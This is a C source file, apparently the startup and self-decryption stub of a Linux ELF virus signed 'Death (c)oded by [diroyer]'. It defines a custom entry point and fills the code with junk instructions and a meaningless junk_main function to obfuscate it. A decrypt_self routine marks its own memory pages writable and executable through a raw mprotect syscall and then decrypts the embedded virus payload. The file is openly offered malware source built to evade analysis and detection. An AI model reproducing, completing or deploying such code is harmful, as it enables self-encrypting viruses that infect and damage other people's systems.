#include <sys/mman.h>

#include "main.h"
#include "crypt.h"
#include "death.h"
#include "syscall.h"


void decrypt_self(void);
void	entrypoint(int argc, char **argv, char **envp);

//void __attribute__((naked, section(".text.start#"))) _start(void)
//{
//	__asm__ __volatile__ (
//			"push %rdx\n"
//			"movq 8(%rsp), %rdi\n"
//			"leaq 16(%rsp), %rsi\n"
//			"leaq 8(%rsi,%rdi,8), %rdx\n"
//			"push %rdi\n"
//			"push %rsi\n"
//			"push %rdx\n"
//			"call decrypt_self\n"
//			"pop %rdx\n"
//			"pop %rsi\n"
//			"pop %rdi\n"
//			"call entrypoint\n"
//			"pop %rdx\n"
//			".global jmp_end\n"
//			"jmp_end:\n"
//			"jmp real_end\n"
//	);
//}
__attribute__((noreturn))
void _start(void) {
	long rbp = (long)__builtin_frame_address(0); JUNK;
	long argc = *(long *)(rbp + 8); JUNK;
	char **argv = (char **)(rbp + 16); JUNK;
	char **envp = argv + argc + 1; JUNK;

	decrypt_self();
	entrypoint((int)argc, argv, envp);

	__builtin_unreachable();
}

__attribute__((noreturn))
void __attribute__((naked)) jmp_end(void) {
	__asm__ __volatile__ (
		"jmp real_end\n"
	);
}

char __attribute__((section(".text#"))) g_signature[SIGNATURE_SIZE] = \
	"Death (c)oded by [diroyer] - deadbeaf:0000\n\0";

uint8_t __attribute__((section(".text#")))	g_key[KEY_SIZE] = {0};
bool __attribute__((section(".text#")))	    g_is_encrypted = false;

int __attribute__((section(".text#")))	    g_start_offset = ORIG_TEXT_OFF;
char __attribute__((section(".text#")))	    **g_envp;

void junk_main(void) {
	char c = 'A';
	char *pc = &c;
	char **ppc = &pc;
	char ***pppc = &ppc;
	char *weird = *(char **)(*(char ***) &pppc);
	int result = *(int *)&weird * *(int *)&weird;
	for (int i = 0; i < 100; i++) {
		result += *(int *)&weird;
		if (result > 0) {
			result = *(int *)&weird;
		} else if (result < 0) {
			result = *(int *)&weird;
		}
	}
}

void decrypt_self(void)
{
	if (g_is_encrypted == false) {
		return;
	}

	if (g_start_offset == ORIG_TEXT_OFF) {

		uintptr_t start = (uintptr_t)&_start;
		uintptr_t end = start + VIRUS_SIZE;

		uintptr_t page_start = start & ~(PAGE_SIZE - 1);
		uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

		__asm__ __volatile__ (
				"movq %0, %%rax\n"
				"movq %1, %%rdi\n"
				"movq %2, %%rsi\n"
				"movq %3, %%rdx\n"
				"syscall\n"
				: /* no output */
				: "r"((long)SYS_mprotect), "r"(page_start), "r"(page_end - page_start), "r"((long)(PROT_READ | PROT_WRITE | PROT_EXEC))
				: "rax", "rdi", "rsi", "memory" /* clobber */
			);

	}

	void *start_addr = (void* )(uintptr_t)&real_start;
	decrypt(start_addr, PAYLOAD_SIZE, g_key);
	return;
}
